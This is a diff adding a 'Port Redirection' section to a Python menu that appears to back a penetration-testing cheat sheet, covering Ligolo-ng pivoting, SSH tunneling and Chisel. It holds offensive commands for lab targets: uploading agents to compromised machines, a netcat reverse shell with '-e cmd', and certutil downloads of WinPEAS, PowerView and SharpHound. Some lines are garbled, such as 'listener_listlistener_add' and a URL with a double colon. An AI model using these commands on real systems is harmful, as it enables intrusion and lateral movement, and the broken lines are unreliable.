@@ -1484,7 +1484,187 @@ menu_structure = {
             ],
         },
     },
-    "Port Redirection": {}
+    "Port Redirection": 
+    {   
+        "Ligolo-ng":
+        {
+            "Connecting to internal network":
+            [
+                {
+                "Uploading agent to compromised machine":
+                    [
+                    ("iwr -uri http://192.168.45.180/agent.exe -Outfile agent.exe","Windows agent"),
+                    ("wget http://192.168.45.188/agent.exe","Linux agent"),
+                    ],
+                },
+                {
+                "Setting up ligolo interface":
+                    [
+                    ("sudo ip tuntap add user kali mode tun ligolo","Creating interface at local kali machine"),
+                    ("sudo ip link set ligolo up","Enabling the interface"),
+                    ("./proxy -selfcert","Running local proxy file"),
+                    ("sudo ip route add 172.16.241.0/24 dev ligolo","Adding route"),
+                    ("ip route list","Verifying that route has been added"),
+                    ],
+                },
+                {
+                "Running agent on compromised machine":
+                    [
+                    (".\\agent.exe -connect 192.168.45.157:11601 -ignore-cert","Windows compromised machine"),
+                    ("./agent -connect 192.168.45.180:11601 -ignore-cert","Linux compromised machine"),
+                    ],
+                },
+                {
+                "Commands after agent connects to proxy":
+                    [
+                    ("help","Information about other commands"),
+                    ("session","Choosing a session"),
+                    ("1","Choosing a session"),
+                    ("ifconfig","Network information on agent"),
+                    ("start","Starting the tunnel"),
+                    ("crackmapexec smb 172.16.208.0/24","Quick check we're in internal network (in new terminal)"),
+                    ],
+                },
+            ],
+            "Connecting to internal port (ex. Secura machine) ":
+            [
+                {"Setting up interface":
+                    [
+                    ("sudo ip tuntap add user kali mode tun ligolo","Creating interface at local kali machine"),
+                    ("sudo ip link set ligolo up","Enabling the interface"),
+                    ("sudo ip route add 240.0.0.1/32 dev ligolo","Adding route"),
+                    ],
+                },
+                {"Starting local proxy":
+                    [
+                    ("./proxy -selfcert","Starting local proxy"),
+                    ],
+                },
+                {"Running agent on compromised machine":
+                    [
+                    (".\\agent.exe -connect 192.168.45.155:11601 -ignore-cert","Running agent on compromised machine"),
+                    ],
+                },
+                {"Running on ligolo proxy":
+                    [
+                    ("session","Ligolo proxy"),
+                    ("1","Ligolo proxy"),
+                    ("start","Ligolo proxy"),
+                    ],
+                },
+                {"Testing connection":
+                    [
+                    ("mysql -u root -h 240.0.0.1 --skip-ssl","Connecting to port available only from target machine"),
+                    ],
+                },               
+            ],
+            "Getting reverse shell from internal network machine":
+            [
+                {"Setting up a listener on local kali machine":
+                    [
+                    ("rlwrap nc -lvnp 4444","Setting up a listener on local kali machine"),
+                    ],
+                },
+                {"Adding listener to our ligolo agent":
+                    [
+                    ("listener_list","View currently active listeners"),
+                    ("listener_listlistener_add --addr 0.0.0.0:1235 --to 127.0.0.1:4444","Adding listener"),
+                    ("listener_list","Confirming that listener has been added"),
+                    ],
+                },
+                {"Setting up reverse shell on internal machine":
+                    [
+                    ("nc.exe 192.168.208.121 1234 -e cmd","Setting up reverse shell on internal machine"),
+                    ],
+                },
+            ],
+            "Transferring files":
+            [
+                { "Setting up another listener on ligolo agent":
+                    [
+                    ("listener_add --addr 0.0.0.0:1234 --to 127.0.0.1:80","Adding listener"),
+                    ("listener_list","Verifying added listener"),
+                    ],
+                },
+                { "Command to run on target machine to download a file":
+                    [
+                    ("certutil -urlcache -f http://192.168.208.121:1235/winpeas.exe winpeas.exe","Downloading file"),
+                    ("certutil -urlcache -f http://192.168.232.122:1234/PowerView.ps1 PowerView.ps1","Downloading file"),
+                    ("certutil -urlcache -f http://192.168.241.122::1234/SharpHound.ps1 SharpHound.ps1","Downloading file"),
+                    ],
+                },
+            ],
+        },
+        "SSH Tunneling":
+            [
+                {
+                "SSH Local Port Forwarding \nCreates a local port on your machine that forwards data to a host behind the SSH server":
+                    [
+                    ("ssh -L [LOCAL_PORT]:[INTERNAL_HOST]:[INTERNAL_PORT] [USER]@[SSH_SERVER]","SSH Local port forwarding"),
+                    ("ssh -L 8080:127.0.0.1:80 user@10.10.10.2","Example #1: If the service is bound to localhost on 10.10.10.2"),
+                    ("ssh -L 8080:10.10.10.2:80 user@10.10.10.2","Example #2: If the service is bound to the target’s external IP (10.10.10.2)"),
+                    ],
+                },
+                {
+                "SSH Dynamic Port Forwarding \nSSH dynamic port forwarding creates a local SOCKS proxy that sends all your traffic through the remote SSH server":
+                    [
+                    ("ssh -D [LOCAL_SOCKS_PORT] [USER]@[REMOTE_SSH_IP]","SSH Dynamic port forwarding"),
+                    ("ssh -D 9050 user@10.10.10.2","Example #1: Opening a SOCKS proxy on local machine at port 9050"),
+                    ("","Example #1: Configure your browser (or tool like proxychains) to use 127.0.0.1:9050 as a SOCKS proxy"),
+                    ("","Example #1: Now, when you navigate to http://10.10.10.2 (or any other site on that network), the traffic is automatically forwarded through the SSH tunnel")
+                    ],
+                },
+                {
+                "SSH Remote Port Forwarding \nYou expose a port on the remote SSH server that forwards back to a host/port on Kali:":
+                    [
+                    ("ssh -R [REMOTE_PORT]:[LOCAL_HOST]:[LOCAL_PORT] [USER]@[REMOTE_SSH_IP]","SSH Remote port forwarding"),
+                    ("ssh -R 8080:192.168.49.133:80 kali@10.10.10.8","Example #1: On the remote SSH server (10.10.10.8), port 8080 will forward traffic to 192.168.49.133:80 (your local Kali machine)"),
+                    ],
+                },
+                {
+                "SSH Remote Dynamic Port Forwarding \nCreates a SOCKS proxy on the remote machine":
+                    [
+                    ("ssh -R [REMOTE_SOCKS_PORT] [USER]@[REMOTE_SSH_IP] -N -f -C -D [REMOTE_SOCKS_PORT]","SSH Remote Dynamic Port Forwarding"),
+                    ],
+                },
+                {
+                "SSHutle \nSets up a VPN-like tunnel, automatically routing traffic for a certain subnet via SSH":
+                    [
+                    ("sudo sshuttle -r [USER]@[REMOTE_SSH_IP] [SUBNET_TO_ROUTE]/[CIDR]","SSHutle"),
+                    ("sudo sshuttle -r kali@10.10.10.8 10.10.11.0/24","Example  #1: All traffic to 10.10.11.x goes through the SSH server 10.10.10.8")
+                    ],
+                },
+
+            ],  
+        "Chisel (Port Forwarding)": 
+        [
+            {
+                "Chisel Server": 
+                [
+                    ("chisel server -p 8000 --reverse", "Start the chisel server on the target in reverse mode")
+                ]
+            },
+            {
+                "Chisel Client - Reverse Forwarding": 
+                [
+                    ("chisel client 10.10.10.2:8000 R:8080:127.0.0.1:80", "On your local machine, forward target's localhost:80 to local port 8080")
+                ]
+            },
+            {
+                "Chisel Client - Local Forwarding": 
+                [
+                    ("chisel client 10.10.10.2:8000 L:8080:10.10.10.2:80", "Forward local port 8080 to target's port 80")
+                ]
+            },
+            {
+                "Differences": [
+
+                    ("Local: Opens a port on your local machine to reach a remote service.", "Local forwarding explanation"),
+                    ("Reverse: Has the remote machine listen on a port and send traffic back to your local machine.", "Reverse forwarding explanation")
+                ]
+            },
+        ],
+    }
 }
 
 #
